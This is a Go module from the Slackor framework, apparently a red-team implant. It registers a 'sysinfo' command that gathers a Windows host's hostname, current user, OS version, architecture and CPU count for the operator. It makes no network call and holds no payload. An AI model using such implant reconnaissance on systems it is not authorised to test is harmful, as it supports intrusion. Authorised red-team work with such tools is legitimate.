package windows

import (
	"runtime"
	"strconv"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

func hostname() string {
	hostnameCmd := command.GetCommand("hostname")
	if hostnameCmd != nil {
		result, _ := hostnameCmd.Run("", "", []string{})
		if result != "" {
			return result
		}
		return "Hostname error"
	}
	return "Hostname unavailable"
}

func whoami() string {
	whoamiCmd := command.GetCommand("whoami")
	if whoamiCmd != nil {
		result, _ := whoamiCmd.Run("", "", []string{})
		if result != "" {
			return result
		}
		return "User ID error"
	}
	return "User ID unavailable"
}

func getVersion() string {
	versionCmd := command.GetCommand("version")
	if versionCmd != nil {
		result, _ := versionCmd.Run("", "", []string{})
		if result != "" {
			return result
		}
		return "OS versioning error"
	}
	return "OS versioning unavailable"
}

// SysInfo dumps general system info
type SysInfo struct{}

// Name is the name of the command
func (s SysInfo) Name() string {
	return "sysinfo"
}

// Run dumps general system info
func (s SysInfo) Run(clientID string, jobID string, args []string) (string, error) {
	stringy := "Hostname            :   " + hostname() + "\nCurrent User        :   " + whoami() +
		"\nOS Version          :   " + getVersion() + "Go Environment      :   " +
		string(runtime.GOARCH) + "\nCPU cores           :   " + strconv.Itoa(int(runtime.NumCPU()))
	return stringy, nil
}

func init() {
	command.RegisterCommand(SysInfo{})
}
